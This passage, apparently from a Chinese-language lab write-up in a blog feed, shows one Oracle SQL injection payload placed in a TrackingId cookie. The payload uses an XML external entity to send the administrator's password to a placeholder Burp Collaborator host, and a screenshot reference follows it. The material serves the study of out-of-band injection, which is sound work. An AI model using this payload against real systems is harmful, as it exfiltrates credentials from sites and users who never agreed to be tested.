+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>x<span class="string">&#x27;+UNION+SELECT+EXTRACTVALUE(xmltype(&#x27;</span><span class="operator">&lt;</span><span class="operator">%</span><span class="number">3</span>fxml<span class="operator">+</span>version<span class="operator">%</span><span class="number">3</span>d&quot;1.0&quot;<span class="operator">+</span>encoding<span class="operator">%</span><span class="number">3</span>d&quot;UTF-8&quot;<span class="operator">%</span><span class="number">3</span>f<span class="operator">&gt;</span><span class="operator">&lt;</span><span class="operator">!</span>DOCTYPE<span class="operator">+</span>root<span class="operator">+</span>[<span class="operator">+</span><span class="operator">&lt;</span><span class="operator">!</span>ENTITY<span class="operator">+</span><span class="operator">%</span><span class="number">25</span><span class="operator">+</span>remote<span class="operator">+</span><span class="keyword">SYSTEM</span><span class="operator">+</span>&quot;http%3a//&#x27;||(SELECT+password+FROM+users+WHERE+username%3d&#x27;administrator&#x27;)||&#x27;.BURP-COLLABORATOR-SUBDOMAIN/&quot;<span class="operator">&gt;</span><span class="operator">+</span><span class="operator">%</span><span class="number">25</span>remote<span class="operator">%</span><span class="number">3</span>b]<span class="operator">&gt;</span><span class="string">&#x27;),&#x27;</span><span class="operator">/</span>l<span class="string">&#x27;)+FROM+dual--</span></span><br></pre></td></tr></table></figure>
+<p><img src="/posts/3b7c6011//image-20250320142450030.png" alt="image-20250320142450030"></p>
 <p>本文参考：</p>
 ]]></content>
       <categories>
